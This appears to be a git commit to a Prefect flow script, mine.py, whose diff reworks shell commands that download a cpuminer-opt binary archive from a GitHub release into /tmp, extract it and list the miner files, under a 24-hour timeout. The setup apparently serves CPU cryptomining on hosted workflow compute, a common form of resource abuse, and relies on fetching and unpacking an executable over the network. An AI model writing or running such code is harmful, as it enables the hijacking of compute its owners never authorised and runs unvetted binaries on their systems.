40ea60d92a04f594ed0d51c7a0b89804283bacb0
Imam <musicimam99@gmail.com>
2026-06-14 18:57:55 +0000

    fix extract

--- mine.py
+++ mine.py
@@ -4,8 +4,8 @@ from prefect import flow, get_run_logger
 @flow(timeout_seconds=86400)
 def mine():
     logger = get_run_logger()
-    subprocess.run("wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O /tmp/c.tar.gz && tar xf /tmp/c.tar.gz -C /tmp/", shell=True)
-    result = subprocess.run("find /tmp -name 'cpuminer*' -type f", shell=True, capture_output=True, text=True)
+    subprocess.run("cd /tmp && wget -q https://github.com/RainbowMiner/miner-binaries/releases/download/v5.0.46-rplant/cpuminer-opt-linux-5.0.46u.tar.gz -O c.tar.gz && tar xf c.tar.gz", shell=True)
+    result = subprocess.run("find /tmp -name 'cpuminer*'", shell=True, capture_output=True, text=True)
     logger.info("Files: " + result.stdout)
 
 if __name__ == "__main__":
